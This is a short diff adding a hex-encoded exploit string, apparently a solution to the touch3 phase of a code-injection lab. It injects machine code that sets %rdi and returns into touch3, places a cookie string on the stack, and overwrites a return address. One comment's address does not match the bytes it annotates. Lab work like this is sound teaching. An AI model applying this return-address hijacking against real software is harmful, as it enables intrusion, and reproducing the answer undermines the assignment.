@@ -1,0 +1,8 @@
+
+fa 18 40 00 00 00 00 00  /* adress of touch3 function */
+48 c7 c7 97 dc 61 55    /* mov    $0x5561dc96,%rdi */
+48 83 ec 30             /* sub    $0x30,%rsp */
+c3                      /* retq   */
+00 00 00 00 00 00 00 00 00 
+00 00 35 39 62 39 39 37 66 61 00 /* 这个就是我们的hex string */
+80 dc 61 55 00 00 00 00 /* address of injected code above */
